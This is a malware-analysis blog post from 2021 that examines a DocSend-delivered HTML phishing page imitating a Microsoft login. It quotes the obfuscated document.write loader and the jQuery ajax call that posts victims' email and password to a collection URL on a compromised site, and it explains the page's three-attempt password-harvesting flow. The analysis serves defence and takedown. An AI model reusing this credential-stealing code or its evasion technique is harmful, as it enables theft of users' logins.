<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=content-language content="en">
<meta name=color-scheme content="light dark">
<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' utteranc.es; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' utteranc.es static.cloudflareinsights.com; prefetch-src 'self'; connect-src 'self' cloudflareinsights.com;">
<meta name=author content="Brian Stadnicki">
<meta name=description content="This phishing sample was delivered through docsend and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from JOESandbox.
MD5: 7d6375abf1cff57c9d7da133cfaf0782
Loader    <!-- TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn ... --><script type='text/javascript'>document.write('\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...');</script><!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R ... G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg ### ### --> There&rsquo;s a large comment full of likely random data to help evade detection, and a call to document.write, which writes text to the document stream.
Packed    First of all, it appears the embedded html page was packed using Proteger HTML, and their license expires on Sun Dec 05 2021 01:29:00 GMT, that&rsquo;s in just 5 days of this post being published.">
<meta name=keywords content="blog,developer,personal">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Docsend Payment Audistore phisher">
<meta name=twitter:description content="This phishing sample was delivered through docsend and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from JOESandbox.
MD5: 7d6375abf1cff57c9d7da133cfaf0782
Loader    <!-- TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn ... --><script type='text/javascript'>document.write('\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...');</script><!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R ... G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg ### ### --> There&rsquo;s a large comment full of likely random data to help evade detection, and a call to document.write, which writes text to the document stream.
Packed    First of all, it appears the embedded html page was packed using Proteger HTML, and their license expires on Sun Dec 05 2021 01:29:00 GMT, that&rsquo;s in just 5 days of this post being published.">
<meta property="og:title" content="Docsend Payment Audistore phisher">
<meta property="og:description" content="This phishing sample was delivered through docsend and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from JOESandbox.
MD5: 7d6375abf1cff57c9d7da133cfaf0782
Loader    <!-- TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn ... --><script type='text/javascript'>document.write('\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...');</script><!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R ... G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg ### ### --> There&rsquo;s a large comment full of likely random data to help evade detection, and a call to document.write, which writes text to the document stream.
Packed    First of all, it appears the embedded html page was packed using Proteger HTML, and their license expires on Sun Dec 05 2021 01:29:00 GMT, that&rsquo;s in just 5 days of this post being published.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://brianstadnicki.github.io/posts/malware-docsend-payment-phisher-audi/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-11-30T00:00:00+00:00">
<meta property="article:modified_time" content="2021-11-30T00:00:00+00:00">
<title>
Docsend Payment Audistore phisher · Brian Stadnicki
</title>
<link rel=canonical href=https://brianstadnicki.github.io/posts/malware-docsend-payment-phisher-audi/>
<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
<link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32>
<link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16>
<link rel=apple-touch-icon href=/images/apple-touch-icon.png>
<link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png>
<meta name=generator content="Hugo 0.91.2">
</head>
<body class="preload-transitions colorscheme-light">
<main class=wrapper>
<nav class=navigation>
<section class=container>
<a class=navigation-title href=/>
Brian Stadnicki
</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle>
<i class="fa fa-bars fa-fw" aria-hidden=true></i>
</label>
<ul class=navigation-list>
<li class=navigation-item>
<a class=navigation-link href=/about/>About</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/posts/>Blog</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/quips/>Quips</a>
</li>
<li class=navigation-item>
<a class=navigation-link href=/contact/>Contact me</a>
</li>
</ul>
</section>
</nav>
<div class=content>
<section class="container post">
<article>
<header>
<div class=post-title>
<h1 class=title>
<a class=title-link href=https://brianstadnicki.github.io/posts/malware-docsend-payment-phisher-audi/>
Docsend Payment Audistore phisher
</a>
</h1>
</div>
<div class=post-meta>
<div class=date>
<span class=posted-on>
<i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-11-30T00:00:00Z>
30 November, 2021
</time>
</span>
<span class=reading-time>
<i class="fa fa-clock-o" aria-hidden=true></i>
2-minute read
</span>
</div>
<div class=categories>
<i class="fa fa-folder" aria-hidden=true></i>
<a href=/categories/malware-analysis/>malware analysis</a></div>
<div class=tags>
<i class="fa fa-tag" aria-hidden=true></i>
<span class=tag>
<a href=/tags/reverse-engineering/>reverse engineering</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/malware/>malware</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/html/>html</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/phishing/>phishing</a>
</span>
<span class=separator>•</span>
<span class=tag>
<a href=/tags/js/>js</a>
</span></div>
</div>
</header>
<div>
<p><img src=/posts/malware-docsend-payment-phisher-audi/overview.png alt=Overview></p>
<p>This phishing sample was delivered through <code>docsend</code> and relies on the user opening the downloaded html file and logging into microsoft. Sample collected from <a href=https://www.joesandbox.com/analysis/898395>JOESandbox</a>.</p>
<p>MD5: <code>7d6375abf1cff57c9d7da133cfaf0782</code></p>
<h1 id=loader>
Loader
<a class=heading-link href=#loader>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>&lt;!--
TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbn
...  --&gt;&lt;script type=&#39;text/javascript&#39;&gt;document.write(&#39;\u003C\u0021\u002D\u002D\u0058\u0056\u005A\u0054\u0074\u006D...&#39;);&lt;/script&gt;&lt;!-- TgZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3R
...
G1vZG8gdHlwaSwgcXVpIG51bmMgbm9iaXMgdmlkZW50dXIgcGFydW0gY2xhcmksIGZpYW50IHNvbGxlbW5lcyBpbiBmdXR1cnVtLg

### ### --&gt;
</code></pre></div><p>There&rsquo;s a large comment full of likely random data to help evade detection, and a call to <code>document.write</code>, which writes text to the document stream.</p>
<h1 id=packed>
Packed
<a class=heading-link href=#packed>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h1>
<p>First of all, it appears the embedded html page was packed using <a href=https://www.ProtegerHtml.com/en>Proteger HTML</a>, and their license expires on <code>Sun Dec 05 2021 01:29:00 GMT</code>, that&rsquo;s in just 5 days of this post being published.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=font-weight:700>var</span> timeexpiracion=1638667740;
<span style=font-weight:700>var</span> timehoy = Math.round(+<span style=font-weight:700>new</span> Date()/1000);
<span style=font-weight:700>if</span> (timehoy&gt;timeexpiracion) { alert (<span style=font-style:italic>&#34;The HTML Code of this Website was Encrypted Free at: www.ProtegerHtml.com/enNOTE: To encrypt your Website without...&#34;</span>
</code></pre></div><p>The blurred out word document is, as usual, just an image hosted on <code>gyazo</code>.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=font-weight:700>body</span> style=<span style=font-style:italic>&#34;background-image:</span> url<span>(&#39;</span>https:<span>//</span>i<span>.</span>gyazo<span>.</span>com<span>/</span>d1b2270a564efe0c37d2e01ed1c647a8<span>.</span>png<span>&#39;);</span> <span>...</span>&gt;
</code></pre></div><h2 id=form>
Form
<a class=heading-link href=#form>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>The microsoft form is a clone in terms of html and css of the real one, the difference is the javascript driving it. The create account and alternative sign-in links are just <code>#</code> of course.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=font-weight:700>var</span> base64regex = <span style=font-style:italic>/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/</span>;
<span style=font-weight:700>if</span> (!base64regex.test(email)) {  
</code></pre></div><p>There&rsquo;s even input validation on the email.</p>
<p>When the user clicks next, the malware fetches the email&rsquo;s logo using clearbit, eg <code>https://logo.clearbit.com/google.com</code>, defaulting to the microsoft logo.</p>
<p><img src=/posts/malware-docsend-payment-phisher-audi/enter-password.png alt="Enter password form"></p>
<p>When the user presses sign in, the text changes to <code>verifying..</code>, and a POST request is sent to the collection server.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>$.ajax({
    dataType: <span style=font-style:italic>&#39;JSON&#39;</span>,
    url: <span style=font-style:italic>&#34;https://www.audistore.com.ar/wp-admin/user/user/next.php&#34;</span>,
    type: <span style=font-style:italic>&#39;POST&#39;</span>,
    data: {
        email: email,
        password: password,
        detail: detail,
    }
</code></pre></div><p>The <code>detail</code> in the request body appears to be nothing.</p>
<div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js>$(<span style=font-style:italic>&#34;#password&#34;</span>).val(<span style=font-style:italic>&#34;&#34;</span>);
<span style=font-weight:700>if</span> (count &gt;= 3) {
    count = 0;
    $(<span style=font-style:italic>&#34;#div2&#34;</span>).animate({ left: 0, opacity: <span style=font-style:italic>&#34;hide&#34;</span> }, 0);
    $(<span style=font-style:italic>&#34;#div3&#34;</span>).animate({ left: 0, opacity: <span style=font-style:italic>&#34;show&#34;</span> }, 500);
    setTimeout(() =&gt; {
        window.location.replace(<span style=font-style:italic>&#34;https://office365.com/&#34;</span>);
    }, 500);
    <span style=font-weight:700>return</span> <span style=font-weight:700>false</span>;
}
</code></pre></div><p>The form errors 2 times before redirecting the user to <code>https://office365.com/</code>, in order to collect any other passwords the user has.</p>
<p><img src=/posts/malware-docsend-payment-phisher-audi/sign-in-attempt-timeout.png alt="Sign in attempt timeout"></p>
<p><img src=/posts/malware-docsend-payment-phisher-audi/password-incorrect.png alt="Password incorrect"></p>
<p>After collecting 3 of the user&rsquo;s passwords, it gives a very dodgy looking success screen.</p>
<p><img src=/posts/malware-docsend-payment-phisher-audi/success-redirecting.png alt="Success redirecting"></p>
<p>Then it redirects to <code>https://office365.com/</code>.</p>
<h2 id=audi-store>
Audi Store
<a class=heading-link href=#audi-store>
<i class="fa fa-link" aria-hidden=true></i>
</a>
</h2>
<p>The credentials are collected at <code>https://www.audistore.com.ar/wp-admin/user/user/next.php</code>. Only the <a href=https://crdf.fr>CRDF</a> has placed this domain on the malicous URL list so far.</p>
<p><img src=/posts/malware-docsend-payment-phisher-audi/audistore.png alt="Audi store"></p>
<p>Looks like somebody forgot to update their wordpress installation&mldr;</p>
<p>I&rsquo;ve contacted them to try to get this removed from their website.</p>
</div>
<footer>
<script src=https://utteranc.es/client.js repo=brianstadnicki/brianstadnicki.github.io issue-term=pathname label theme=preferred-color-scheme crossorigin=anonymous async></script>
</footer>
</article>
</section>
</div>
<footer class=footer>
<section class=container>
<p>Education through a 1000 mistakes</p>
©
2021 -
2022
Brian Stadnicki
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.
</section>
</footer>
</main>
<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
<script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "f5dd1cc794e748f0a1fa431f62434694"}'></script>
</body>
</html>